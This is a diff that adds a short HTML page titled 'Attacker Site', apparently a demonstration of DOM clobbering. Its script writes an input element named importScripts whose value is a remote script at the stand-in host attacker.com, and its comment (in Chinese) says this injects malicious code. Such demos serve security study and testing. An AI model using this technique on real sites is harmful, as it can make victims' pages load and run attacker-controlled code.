@@ -1,0 +1,15 @@
+<!-- attacker.html -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attacker Site</title>
+  </head>
+  <body>
+    <script>
+      // 注入惡意代碼影響 importScripts
+      document.write('<input name="importScripts" value="https://attacker.com/malicious.js">');
+    </script>
+  </body>
+</html>
